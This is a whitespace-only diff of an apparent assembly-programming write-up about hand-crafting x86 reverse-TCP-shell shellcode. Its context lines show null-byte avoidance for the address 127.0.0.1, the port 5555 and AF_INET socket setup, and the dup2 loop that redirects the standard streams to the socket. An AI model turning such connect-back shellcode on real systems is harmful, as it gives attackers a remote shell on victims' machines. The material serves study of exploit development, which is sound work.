@@ -163,7 +163,7 @@ Now it's time to confront the NULL BYTE demon. We want to push `1.0.0.127` onto 
 
 ```nasm
     mov ecx, 0x02010180
-	  sub ecx, 0x01010101
+    sub ecx, 0x01010101
 ```
 
 Now we push ECX onto the stack and continue on as we did in Assignment #1 for pretty much the rest of our assembly code. 
@@ -192,8 +192,8 @@ All that dup2 requires for an argument is the `int sockfd` which was newly creat
 
 ```nasm
     xor eax, eax
-	  xor ebx, ebx
-   	xor ecx, ecx
+    xor ebx, ebx
+    xor ecx, ecx
     
     mov cl, 0x3     ; putting 3 in the counter
     
@@ -287,13 +287,13 @@ _start:
 	mov ax, 0x16a 
 	mov ebx, edi
 	xor ecx, ecx
-	push ecx		            ; pushing our 8 bytes of zero as per: home.iitk.ac.in/~chebrolu/scourse/slides/sockets-tutorial.pdf
+	push ecx		; pushing our 8 bytes of zero as per: home.iitk.ac.in/~chebrolu/scourse/slides/sockets-tutorial.pdf
 				      
 	
 	mov ecx, 0x02010180     ; moving 2.1.1.128 into ecx
 	sub ecx, 0x01010101     ; subtracting 1.1.1.1 from ecx
 	
-	push ecx		            ; putting 1.0.0.127 onto the stack (null free)
+	push ecx		      ; putting 1.0.0.127 onto the stack (null free)
 	push word 0xb315	      ; port 5555
 	push word 0x02		      ; AF_INET
 	
